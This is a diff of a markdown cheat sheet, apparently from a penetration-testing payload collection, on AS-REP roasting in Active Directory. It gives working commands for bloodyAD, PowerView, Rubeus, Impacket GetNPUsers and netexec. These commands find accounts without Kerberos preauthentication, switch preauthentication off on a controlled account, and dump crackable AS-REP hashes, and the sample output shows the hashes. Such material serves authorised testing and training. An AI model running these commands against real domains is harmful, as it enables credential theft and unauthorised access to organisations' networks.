@@ -2,25 +2,34 @@
 
 > If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
 
-**Requirements**:
+## Requirements:
 
-* Accounts with the attribute **DONT_REQ_PREAUTH**
-    * Windows/Linux:
-
-    ```ps1
+### Accounts with the attribute 'DONT_REQ_PREAUTH'
+    - Linux:
+    ```bash
     bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
     ```
 
-    * Windows only:
+    - Windows (Powerview) only:
 
     ```ps1
+    Get-DomainUser -UACFilter DONT_REQ_PREAUTH
     PowerView > Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
     ```
-
-* [Rubeus](https://github.com/GhostPack/Rubeus)
+    - Windows (Rubeus):
+    ```ps1
+    Rubeus.exe asreproast /format:hashcat
+    ```
+### Set DON'T_REQ-PREAUTH using Powerview
+> Useful if you have generic all over an account and don't want to reset the password
+    ```ps1
+    Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+    ```
+## ASREP Roast from Windows
+### [Rubeus](https://github.com/GhostPack/Rubeus)
 
   ```powershell
-  C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast
+  C:\Rubeus>Rubeus.exe asreproast /user:TestOU3user /domain:<domain /dc:<dc fQDN> format:hashcat /nowrap /outfile:hashes.asreproast
   [*] Action: AS-REP roasting
   [*] Target User            : TestOU3user
   [*] Target Domain          : testlab.local
@@ -36,10 +45,10 @@
 
   $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)...
   ```
-
+## ASREP Roast from Linux
 * [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) from Impacket Suite
 
-  ```powershell
+  ```bash
   $ python GetNPUsers.py htb.local/svc-alfresco -no-pass
   [*] Getting TGT for svc-alfresco
   $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4
@@ -51,7 +60,7 @@
 
 * netexec Module
 
-  ```powershell
+  ```bash
   $ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
   LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
   ```
